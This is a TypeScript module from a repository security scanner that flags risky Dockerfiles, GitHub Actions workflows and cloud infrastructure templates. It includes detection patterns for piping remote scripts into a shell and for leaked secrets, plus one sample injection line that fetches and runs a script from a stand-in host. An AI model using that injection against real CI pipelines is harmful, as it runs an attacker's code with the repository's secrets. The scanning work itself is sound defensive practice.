import { parseDocument } from "yaml";
import type { Check, FileEdit, Finding, Patch, RepoFile, Severity } from "../types.js";
import { lineAt, VENDOR } from "../util.js";

/**
 * Checks for the files around the code that decide how it runs: Dockerfiles, CI workflows and
 * infrastructure templates (CloudFormation/SAM, Terraform, Kubernetes). YAML is parsed, not grepped.
 */

function yamlOf(content: string): unknown {
  try {
    const doc = parseDocument(content, { logLevel: "silent", uniqueKeys: false });
    return doc.errors.length ? null : doc.toJS({ maxAliasCount: 50 });
  } catch {
    return null;
  }
}

function obj(v: unknown): Record<string, unknown> | null {
  return typeof v === "object" && v !== null && !Array.isArray(v) ? (v as Record<string, unknown>) : null;
}

function arr(v: unknown): unknown[] {
  return Array.isArray(v) ? v : v === undefined || v === null ? [] : [v];
}

/** First line in `content` that contains `needle`, for pointing a finding at the right place. */
function lineOf(content: string, needle: string, from = 0): number {
  const i = content.indexOf(needle, from);
  return i >= 0 ? lineAt(content, i) : 1;
}

function f(checkId: string, file: RepoFile, line: number, severity: Severity, title: string, explanation: string, evidence?: string, remedy?: string): Finding {
  return { checkId, title, severity, file: file.path, line, evidence, explanation, remedy };
}

// =============================================================================================
// Dockerfile

const DOCKERFILE = /(^|\/)(Dockerfile|Containerfile)([.-][\w.-]+)?$|\.dockerfile$/i;

interface DockerLine {
  line: number;
  instr: string;
  args: string;
  raw: string;
}

function dockerLines(content: string): DockerLine[] {
  const out: DockerLine[] = [];
  const lines = content.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const start = i;
    let text = lines[i];
    while (/\\\s*$/.test(text) && i + 1 < lines.length) text = text.replace(/\\\s*$/, " ") + lines[++i];
    const m = /^\s*([A-Za-z]+)\s+(.*)$/.exec(text);
    if (m && !text.trim().startsWith("#")) out.push({ line: start + 1, instr: m[1].toUpperCase(), args: m[2].trim(), raw: lines[start] });
  }
  return out;
}

interface DockerResult {
  findings: Finding[];
  /** Fix: the USER line to insert before this CMD/ENTRYPOINT line (1-based). */
  userBefore?: { file: RepoFile; line: number; user: string };
}

function dockerfile(file: RepoFile, files: RepoFile[]): DockerResult {
  const id = "dockerfile-security";
  const ls = dockerLines(file.content);
  const findings: Finding[] = [];
  const stages = ls.filter((l) => l.instr === "FROM");
  if (stages.length === 0) return { findings };
  const last = stages[stages.length - 1];
  const finalStage = ls.filter((l) => l.line >= last.line);

  for (const s of stages) {
    const image = s.args.split(/\s+/)[0];
    if (/^(scratch|\$)/.test(image) || stages.some((o) => new RegExp(`\\bAS\\s+${image.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\b`, "i").test(o.args))) continue;
    if (!image.includes("@sha256:") && (!/:[^/]+$/.test(image) || /:latest$/.test(image))) {
      findings.push(f(id, file, s.line, "low", "Base image not pinned to a version", "An unpinned image changes under you on every build, so a broken or compromised upstream release ships without anyone noticing.", s.raw.trim(), `Pin a version, e.g. FROM ${image.replace(/:latest$/, "")}:22-alpine, or a digest (@sha256:…).`));
    }
  }

  const users = finalStage.filter((l) => l.instr === "USER");
  const lastUser = users[users.length - 1]?.args.split(/[:\s]/)[0];
  let userBefore: DockerResult["userBefore"];
  if (!lastUser || lastUser === "root" || lastUser === "0") {
    const cmd = finalStage.find((l) => l.instr === "CMD" || l.instr === "ENTRYPOINT");
    findings.push(f(id, file, users[users.length - 1]?.line ?? last.line, "medium", "Container runs as root", "If anything in the app is exploited, the attacker is root inside the container, which makes escaping to the host or other containers much easier.", users.length ? users[users.length - 1].raw.trim() : "no USER instruction", "Add `USER node` (Node images) or create a user with `RUN adduser -D app` and `USER app` before CMD."));
    if (cmd && /^node:|\/node:/.test(last.args.split(/\s+/)[0]) && !users.length) userBefore = { file, line: cmd.line, user: "node" };
  }

  for (const l of ls) {
    if ((l.instr === "ENV" || l.instr === "ARG") && /(passw|secret|token|api[_-]?key|private[_-]?key|access[_-]?key)\w*\s*[= ]\s*["']?[^\s"'$]{4,}/i.test(l.args)) {
      findings.push(f(id, file, l.line, "high", `Secret baked into the image (${l.instr})`, "ENV and ARG values are stored in the image layers and history; anyone who can pull the image can read them.", l.raw.trim().replace(/([= ]["']?)([^\s"']{3})[^\s"']*/, "$1$2…"), "Pass secrets at run time (environment from your platform's secret store) or use BuildKit secrets: RUN --mount=type=secret."));
    }
    if (l.instr === "ADD" && /https?:\/\//.test(l.args)) {
      findings.push(f(id, file, l.line, "medium", "ADD downloads a file without checking it", "ADD from a URL takes whatever the server returns, with no checksum, so a compromised host changes your image.", l.raw.trim(), "Download with curl, check the SHA-256, then use it: RUN curl -fsSLo x URL && echo 'HASH  x' | sha256sum -c."));
    }
    if (l.instr === "RUN" && /(curl|wget)[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b/.test(l.args)) {
      findings.push(f(id, file, l.line, "medium", "Remote script piped into a shell", "Whatever the URL serves on build day runs as root in the image, unchecked.", l.raw.trim(), "Download the script, verify its checksum or signature, then run it."));
    }
    if (l.instr === "RUN" && /\bchmod\s+(-R\s+)?777\b/.test(l.args)) {
      findings.push(f(id, file, l.line, "low", "World-writable files (chmod 777)", "Any process in the container can then change these files, including the app's own code.", l.raw.trim(), "Give ownership to the app user (chown) and keep 755/644."));
    }
  }

  const dir = file.path.includes("/") ? file.path.slice(0, file.path.lastIndexOf("/") + 1) : "";
  const copiesAll = ls.some((l) => (l.instr === "COPY" || l.instr === "ADD") && /(^|\s)\.\/?(\s|$)/.test(l.args.replace(/--\S+\s*/g, "")));
  if (copiesAll && !files.some((x) => x.path === `${dir}.dockerignore` || x.path === ".dockerignore")) {
    const l = ls.find((x) => (x.instr === "COPY" || x.instr === "ADD") && /(^|\s)\.\/?(\s|$)/.test(x.args))!;
    findings.push(f(id, file, l.line, "medium", "COPY . without a .dockerignore", "The whole folder goes into the image, including .env files, .git history and local keys, and anyone with the image can read them.", l.raw.trim(), "Add a .dockerignore with at least .env*, .git and node_modules."));
  }
  return { findings, userBefore };
}

export const dockerfileSecurity: Check = {
  id: "dockerfile-security",
  group: "C-security",
  title: "Container image hardening",
  severity: "medium",
  mode: "auto",
  skip: ({ repo }) => (repo.files.some((x) => DOCKERFILE.test(x.path) && !VENDOR.test(x.path)) ? null : "no Dockerfile in the repo"),
  detect: ({ repo }) => repo.files.filter((x) => DOCKERFILE.test(x.path) && !VENDOR.test(x.path)).flatMap((x) => dockerfile(x, repo.files).findings),
  fix({ repo }): Patch | null {
    const edits: FileEdit[] = [];
    for (const file of repo.files.filter((x) => DOCKERFILE.test(x.path) && !VENDOR.test(x.path))) {
      const r = dockerfile(file, repo.files);
      if (r.userBefore) {
        const lines = file.content.split("\n");
        lines.splice(r.userBefore.line - 1, 0, `USER ${r.userBefore.user}`);
        edits.push({ kind: "modify", path: file.path, before: file.content, after: lines.join("\n") });
      }
      const dir = file.path.includes("/") ? file.path.slice(0, file.path.lastIndexOf("/") + 1) : "";
      const ignore = `${dir}.dockerignore`;
      if (r.findings.some((x) => x.title.startsWith("COPY . without")) && !edits.some((e) => e.path === ignore)) {
        edits.push({ kind: "create", path: ignore, content: ".env\n.env.*\n!.env.example\n.git\nnode_modules\nnpm-debug.log\ncoverage\n*.pem\n*.key\n" });
      }
    }
    if (edits.length === 0) return null;
    return {
      id: "dockerfile-security-1",
      checkId: "dockerfile-security",
      title: "Run the container as a non-root user and keep secrets out of the image",
      class: "additive",
      reason:
        "Adds USER node before the start command (the official Node images ship that user) and a .dockerignore that keeps .env files, .git and node_modules out of the build context. If the app writes to its own folder at run time, give that folder to node with COPY --chown=node:node.",
      edits,
    };
  },
};

// =============================================================================================
// GitHub Actions

const WORKFLOW = /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/;
const UNTRUSTED_CTX = /\$\{\{\s*(github\.event\.(issue\.(title|body)|pull_request\.(title|body|head\.ref|head\.label|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|discussion\.(title|body)|pages\.[^}]*page_name|head_commit\.(message|author\.(email|name))|commits\.[^}]*\.(message|author\.(email|name))|workflow_run\.(head_branch|head_commit\.message))|github\.head_ref)\s*\}\}/;

interface WorkflowResult {
  findings: Finding[];
  needsPermissions: boolean;
}

function workflow(file: RepoFile): WorkflowResult {
  const id = "ci-security";
  const wf = obj(yamlOf(file.content));
  if (!wf) return { findings: [], needsPermissions: false };
  const findings: Finding[] = [];
  const on = wf.on ?? wf[true as unknown as string];
  const triggers = typeof on === "string" ? [on] : Array.isArray(on) ? on.map(String) : Object.keys(obj(on) ?? {});
  const prTarget = triggers.includes("pull_request_target") || triggers.includes("workflow_run");
  const jobs = obj(wf.jobs) ?? {};
  let jobsWithoutPerms = 0;

  for (const [jobName, jobRaw] of Object.entries(jobs)) {
    const job = obj(jobRaw);
    if (!job) continue;
    if (job.permissions === undefined) jobsWithoutPerms++;
    for (const stepRaw of arr(job.steps)) {
      const step = obj(stepRaw);
      if (!step) continue;
      const uses = typeof step.uses === "string" ? step.uses : "";
      const run = typeof step.run === "string" ? step.run : "";
      const withs = obj(step.with) ?? {};
      if (prTarget && /^actions\/checkout@/.test(uses) && /github\.event\.(pull_request\.head\.(sha|ref)|workflow_run\.head_(sha|branch))|github\.head_ref|refs\/pull\//.test(String(withs.ref ?? ""))) {
        findings.push(f(id, file, lineOf(file.content, String(withs.ref)), "critical", `pull_request_target checks out the pull request's code (job ${jobName})`, "This workflow runs with the repo's secrets and write token but builds code from a stranger's pull request, so any PR can steal the secrets or push to main ('pwn request').", `ref: ${String(withs.ref)}`, "Use the pull_request trigger for building PR code, or split into an untrusted build job and a trusted job that only reads its artifacts."));
      }
      const injected = UNTRUSTED_CTX.exec(run) ?? UNTRUSTED_CTX.exec(typeof withs.script === "string" ? withs.script : "");
      if (injected) {
        findings.push(f(id, file, lineOf(file.content, injected[0]), "high", `Untrusted text pasted into a script (job ${jobName})`, `${injected[1]} is written by whoever opens the issue or PR. Inside run:, a title like \`"; curl evil.sh | sh #\` runs as a command with this job's token.`, injected[0], `Pass it through an environment variable: env: TITLE: \${{ ${injected[1]} }} and use "$TITLE" in the script.`));
      }
      if (/echo[^\n]*\$\{\{\s*secrets\./.test(run)) {
        findings.push(f(id, file, lineOf(file.content, "secrets."), "high", `Secret printed in a CI step (job ${jobName})`, "Masking misses secrets that are transformed or split, and logs of public repos are public.", undefined, "Never echo secrets; pass them to tools through env: and let the tool read them."));
      }
      if (uses && !/^(actions|github)\//.test(uses) && !uses.startsWith("./") && !uses.startsWith("docker://") && !/@[0-9a-f]{40}$/.test(uses)) {
        findings.push(f(id, file, lineOf(file.content, uses), "low", "Third-party action not pinned to a commit", `${uses} can be changed by its owner (or whoever takes over their account) after you adopt it, and the new code runs with this job's secrets.`, uses, `Pin the full commit SHA: ${uses.split("@")[0]}@<40-character sha> # ${uses.split("@")[1] ?? "version"}`));
      }
    }
  }
  const needsPermissions = wf.permissions === undefined && jobsWithoutPerms > 0;
  if (needsPermissions) {
    findings.push(f(id, file, 1, "medium", "Workflow token has default permissions", "Without a permissions block the GITHUB_TOKEN may have write access to the repo, packages and releases, so any compromised step can push code.", undefined, "Add `permissions: contents: read` at the top and grant more per job only where needed."));
  }
  return { findings, needsPermissions };
}

export const ciSecurity: Check = {
  id: "ci-security",
  group: "C-security",
  title: "CI pipeline security",
  severity: "high",
  mode: "auto",
  skip: ({ repo }) => (repo.files.some((x) => WORKFLOW.test(x.path)) ? null : "no GitHub Actions workflows"),
  detect: ({ repo }) => repo.files.filter((x) => WORKFLOW.test(x.path)).flatMap((x) => workflow(x).findings),
  fix({ repo }): Patch | null {
    const edits: FileEdit[] = [];
    for (const file of repo.files.filter((x) => WORKFLOW.test(x.path))) {
      if (!workflow(file).needsPermissions) continue;
      const after = file.content.replace(/\n*$/, "\n") + "\n# Least privilege for the GITHUB_TOKEN (added by Siidekick). Grant more per job if one needs it.\npermissions:\n  contents: read\n";
      edits.push({ kind: "modify", path: file.path, before: file.content, after });
    }
    if (edits.length === 0) return null;
    return {
      id: "ci-security-1",
      checkId: "ci-security",
      title: "Give workflow tokens read-only permissions",
      class: "additive",
      reason: "Adds a top-level permissions block so the GITHUB_TOKEN can only read the repo. A job that publishes, comments or pushes needs its own permissions block (for example contents: write) after this.",
      edits,
    };
  },
};

// =============================================================================================
// Infrastructure as code

const RISKY_PORTS: Record<number, string> = { 22: "SSH", 3389: "RDP", 3306: "MySQL", 5432: "PostgreSQL", 27017: "MongoDB", 6379: "Redis", 9200: "Elasticsearch", 11211: "Memcached", 2375: "Docker API", 5984: "CouchDB", 1433: "SQL Server" };

function riskyPortsIn(from: number, to: number): string[] {
  return Object.entries(RISKY_PORTS)
    .filter(([p]) => Number(p) >= from && Number(p) <= to)
    .map(([p, name]) => `${name} (${p})`);
}

function statementsOf(doc: unknown): Record<string, unknown>[] {
  const d = obj(doc);
  return arr(d?.Statement).map(obj).filter((s): s is Record<string, unknown> => s !== null);
}

function wildcardAdmin(st: Record<string, unknown>): boolean {
  return st.Effect !== "Deny" && arr(st.Action).some((a) => a === "*" || a === "*:*") && arr(st.Resource).some((r) => r === "*");
}

function cloudFormation(file: RepoFile, tpl: Record<string, unknown>): Finding[] {
  const id = "iac-security";
  const out: Finding[] = [];
  const resources = obj(tpl.Resources) ?? {};
  for (const [name, raw] of Object.entries(resources)) {
    const r = obj(raw);
    const type = String(r?.Type ?? "");
    const p = obj(r?.Properties) ?? {};
    const at = lineOf(file.content, `${name}:`) || lineOf(file.content, `"${name}"`);
    const add = (sev: Severity, title: string, why: string, fix: string) => out.push(f(id, file, at, sev, `${title} (${name})`, why, type, fix));

    if (type === "AWS::S3::Bucket") {
      if (/^PublicRead(Write)?$/.test(String(p.AccessControl ?? ""))) add("high", "S3 bucket is public", "Everyone on the internet can list and read this bucket" + (p.AccessControl === "PublicReadWrite" ? " and write to it" : "") + ".", "Remove AccessControl and serve files through CloudFront with Origin Access Control.");
      const pab = obj(p.PublicAccessBlockConfiguration);
      if (pab && Object.values(pab).some((v) => v === false || v === "false")) add("medium", "S3 public access block is switched off", "Turning off Block Public Access lets a later policy or ACL make the data public by mistake.", "Set all four PublicAccessBlockConfiguration flags to true.");
    }
    if (type === "AWS::S3::BucketPolicy") {
      for (const st of statementsOf(p.PolicyDocument)) {
        const principal = st.Principal;
        const anyone = principal === "*" || arr(obj(principal)?.AWS).includes("*");
        if (!anyone || st.Effect === "Deny" || st.Condition) continue;
        const actions = arr(st.Action).map(String);
        if (actions.some((a) => /^s3:(\*|Put|Delete)/.test(a))) add("critical", "Anyone can write to or delete from this S3 bucket", "The policy grants write or delete access to every AWS account and anonymous users.", "Limit Principal to your roles or CloudFront's service principal with an aws:SourceArn condition.");
        else if (actions.some((a) => /^s3:(Get|List)/.test(a))) add("medium", "S3 bucket readable by anyone", "Every object is downloadable by anyone with the URL. That is fine for a public website, not for uploads or exports.", "If it is a website, serve it through CloudFront with Origin Access Control and keep the bucket private.");
      }
    }
    const policyDocs: unknown[] = [];
    if (/^AWS::IAM::(Role|User|Group)$/.test(type)) for (const pol of arr(p.Policies)) policyDocs.push(obj(pol)?.PolicyDocument);
    if (/^AWS::IAM::(Policy|ManagedPolicy)$/.test(type)) policyDocs.push(p.PolicyDocument);
    if (type === "AWS::Serverless::Function") for (const pol of arr(p.Policies)) if (obj(pol)?.Statement) policyDocs.push(pol);
    if (policyDocs.some((d) => statementsOf(d).some(wildcardAdmin))) add("high", "IAM policy allows every action on every resource", "Whoever gets this role's credentials (a bug in the function, a leaked key) controls the whole AWS account.", "List the specific actions and resource ARNs the code needs, e.g. dynamodb:GetItem on the one table.");
    if (arr(p.ManagedPolicyArns).some((a) => /AdministratorAccess|PowerUserAccess|IAMFullAccess/.test(String(a)))) add("high", "Role has administrator rights", "An administrator policy on an application role turns any code bug into an account takeover.", "Replace it with a policy that names the exact actions and resources needed.");

    if (type === "AWS::EC2::SecurityGroup" || type === "AWS::EC2::SecurityGroupIngress") {
      const rules = type === "AWS::EC2::SecurityGroup" ? arr(p.SecurityGroupIngress).map(obj) : [p];
      for (const rule of rules) {
        if (!rule) continue;
        const open = rule.CidrIp === "0.0.0.0/0" || rule.CidrIpv6 === "::/0";
        if (!open) continue;
        const proto = String(rule.IpProtocol ?? "");
        const from = Number(rule.FromPort ?? 0);
        const to = Number(rule.ToPort ?? from);
        if (proto === "-1" || proto === "all") add("high", "Security group open to the internet on every port", "Every service on the instance, including databases and SSH, is reachable from anywhere.", "Open only 80/443 to the internet and limit admin ports to your own IP or a VPN.");
        else {
          const risky = riskyPortsIn(from, to);
          if (risky.length) add("high", `${risky.join(", ")} open to the internet`, "These ports are scanned constantly; an open SSH or database port gets brute-force and exploit attempts within minutes.", "Allow these ports only from your IP, a bastion or the app's security group.");
        }
      }
    }
    if (type === "AWS::RDS::DBInstance" || type === "AWS::RDS::DBCluster") {
      if (p.PubliclyAccessible === true || p.PubliclyAccessible === "true") add("high", "Database reachable from the internet", "A public RDS endpoint can be attacked directly with password guessing and database exploits.", "Set PubliclyAccessible: false and connect from inside the VPC.");
      if (p.StorageEncrypted === false || p.StorageEncrypted === "false") add("medium", "Database storage not encrypted", "Snapshots and disks hold the data in clear text.", "Set StorageEncrypted: true (it can only be set when the database is created).");
    }
    if ((type === "AWS::Lambda::Url" && p.AuthType === "NONE") || (type === "AWS::Serverless::Function" && obj(p.FunctionUrlConfig)?.AuthType === "NONE")) {
      add("low", "Public Lambda function URL", "Anyone can call this function directly, bypassing API Gateway throttling and WAF.", "Use AWS_IAM auth, or put it behind API Gateway or CloudFront with rate limits.");
    }
    if (type === "AWS::CloudFront::Distribution") {
      const cfg = obj(p.DistributionConfig);
      const behaviours = [cfg?.DefaultCacheBehavior, ...arr(cfg?.CacheBehaviors)].map(obj);
      if (behaviours.some((b) => b?.ViewerProtocolPolicy === "allow-all")) add("medium", "CloudFront serves plain HTTP", "allow-all lets browsers use http://, where traffic can be read and changed.", "Set ViewerProtocolPolicy: redirect-to-https.");
    }
  }
  return out;
}

function terraform(file: RepoFile): Finding[] {
  const id = "iac-security";
  const out: Finding[] = [];
  const c = file.content;
  const at = (i: number) => lineAt(c, i);
  for (const m of c.matchAll(/\bacl\s*=\s*"(public-read(?:-write)?)"/g)) out.push(f(id, file, at(m.index!), "high", "S3 bucket ACL makes it public", "Everyone on the internet can read this bucket.", m[0], "Remove the ACL and keep aws_s3_bucket_public_access_block fully on."));
  for (const m of c.matchAll(/\b(block_public_acls|block_public_policy|ignore_public_acls|restrict_public_buckets)\s*=\s*false/g)) out.push(f(id, file, at(m.index!), "medium", "S3 public access block switched off", "A later policy or ACL can then make the data public by mistake.", m[0], "Set all four flags to true."));
  for (const m of c.matchAll(/\bpublicly_accessible\s*=\s*true/g)) out.push(f(id, file, at(m.index!), "high", "Database reachable from the internet", "A public database endpoint is attacked directly.", m[0], "Set publicly_accessible = false."));
  for (const m of c.matchAll(/\bstorage_encrypted\s*=\s*false/g)) out.push(f(id, file, at(m.index!), "medium", "Database storage not encrypted", "Disks and snapshots hold the data in clear text.", m[0], "Set storage_encrypted = true."));
  for (const m of c.matchAll(/\bingress\s*\{([^{}]*)\}/g)) {
    const body = m[1];
    if (!/cidr_blocks\s*=\s*\[[^\]]*"0\.0\.0\.0\/0"/.test(body) && !/ipv6_cidr_blocks\s*=\s*\[[^\]]*"::\/0"/.test(body)) continue;
    const from = Number(/from_port\s*=\s*(\d+)/.exec(body)?.[1] ?? 0);
    const to = Number(/to_port\s*=\s*(\d+)/.exec(body)?.[1] ?? from);
    const all = /protocol\s*=\s*"(-1|all)"/.test(body);
    const risky = riskyPortsIn(from, to);
    if (all || risky.length) out.push(f(id, file, at(m.index!), "high", all ? "Security group open to the internet on every port" : `${risky.join(", ")} open to the internet`, "Open admin and database ports get brute-force and exploit attempts within minutes.", "ingress 0.0.0.0/0", "Allow these ports only from your IP, a bastion or another security group."));
  }
  for (const m of c.matchAll(/"Action"\s*:\s*"\*"[\s\S]{0,200}?"Resource"\s*:\s*"\*"|\bactions\s*=\s*\[\s*"\*"\s*\][\s\S]{0,200}?\bresources\s*=\s*\[\s*"\*"\s*\]/g)) {
    out.push(f(id, file, at(m.index!), "high", "IAM policy allows every action on every resource", "Whoever gets these credentials controls the whole AWS account.", "Action * on Resource *", "Name the exact actions and resources needed."));
  }
  return out;
}

function kubernetes(file: RepoFile, docs: Record<string, unknown>[]): Finding[] {
  const id = "iac-security";
  const out: Finding[] = [];
  for (const d of docs) {
    const kind = String(d.kind ?? "");
    const name = String(obj(d.metadata)?.name ?? kind);
    const spec = obj(d.spec);
    const podSpec = kind === "Pod" ? spec : kind === "CronJob" ? obj(obj(obj(obj(spec?.jobTemplate)?.spec)?.template)?.spec) : obj(obj(spec?.template)?.spec);
    if (!podSpec) continue;
    const at = lineOf(file.content, `name: ${name}`);
    if (podSpec.hostNetwork === true || podSpec.hostPID === true) out.push(f(id, file, at, "high", `Pod shares the host's network or processes (${name})`, "hostNetwork and hostPID remove the isolation between the container and the node.", kind, "Remove hostNetwork/hostPID unless this is a node-level agent."));
    for (const c of [...arr(podSpec.containers), ...arr(podSpec.initContainers)].map(obj)) {
      if (!c) continue;
      const sc = obj(c.securityContext) ?? {};
      const cname = String(c.name ?? "container");
      if (sc.privileged === true) out.push(f(id, file, lineOf(file.content, "privileged: true"), "high", `Privileged container (${cname})`, "A privileged container has full access to the node; escaping it is trivial.", "privileged: true", "Remove privileged and add only the capabilities the process needs."));
      if (sc.allowPrivilegeEscalation === true) out.push(f(id, file, lineOf(file.content, "allowPrivilegeEscalation: true"), "medium", `Privilege escalation allowed (${cname})`, "A process can gain more rights than it started with (setuid binaries).", "allowPrivilegeEscalation: true", "Set allowPrivilegeEscalation: false."));
      if (sc.runAsUser === 0 || sc.runAsNonRoot === false) out.push(f(id, file, at, "medium", `Container runs as root (${cname})`, "Code execution in the app means root in the container.", "runAsUser: 0", "Set runAsNonRoot: true and a non-zero runAsUser."));
      const image = String(c.image ?? "");
      if (image && !image.includes("@sha256:") && (!/:[^/]+$/.test(image) || image.endsWith(":latest"))) out.push(f(id, file, lineOf(file.content, image), "low", `Image not pinned (${cname})`, "Every restart can pull a different image.", image, "Pin a version tag or digest."));
    }
  }
  return out;
}

function iacFindings(files: RepoFile[]): Finding[] {
  const out: Finding[] = [];
  for (const file of files) {
    if (VENDOR.test(file.path) || /(^|\/)(test|tests|__tests__|fixtures?)\//.test(file.path)) continue;
    if (file.path.endsWith(".tf")) {
      out.push(...terraform(file));
      continue;
    }
    const isYaml = /\.ya?ml$/i.test(file.path);
    const isJson = /\.json$/i.test(file.path) && /"Resources"\s*:/.test(file.content) && /"AWS::/.test(file.content);
    if (!isYaml && !isJson) continue;
    if (WORKFLOW.test(file.path)) continue;
    if (isJson) {
      try {
        const tpl = obj(JSON.parse(file.content));
        if (tpl?.Resources) out.push(...cloudFormation(file, tpl));
      } catch {
        /* not JSON */
      }
      continue;
    }
    if (/AWSTemplateFormatVersion|Type:\s*AWS::|Transform:\s*AWS::Serverless/.test(file.content)) {
      const tpl = obj(yamlOf(file.content));
      if (tpl?.Resources) out.push(...cloudFormation(file, tpl));
    } else if (/^apiVersion:/m.test(file.content) && /^kind:/m.test(file.content)) {
      const docs = file.content.split(/^---\s*$/m).map((d) => obj(yamlOf(d))).filter((d): d is Record<string, unknown> => d !== null);
      out.push(...kubernetes(file, docs));
    }
  }
  return out;
}

const IAC_FILE = (x: RepoFile) =>
  !VENDOR.test(x.path) &&
  (x.path.endsWith(".tf") || (/\.(ya?ml|json)$/i.test(x.path) && /AWSTemplateFormatVersion|"?Type"?:\s*"?AWS::|^apiVersion:/m.test(x.content)));

export const iacSecurity: Check = {
  id: "iac-security",
  group: "C-security",
  title: "Cloud infrastructure configuration",
  severity: "high",
  mode: "report",
  skip: ({ repo }) => (repo.files.some(IAC_FILE) ? null : "no CloudFormation, SAM, Terraform or Kubernetes files"),
  detect: ({ repo }) => iacFindings(repo.files),
};
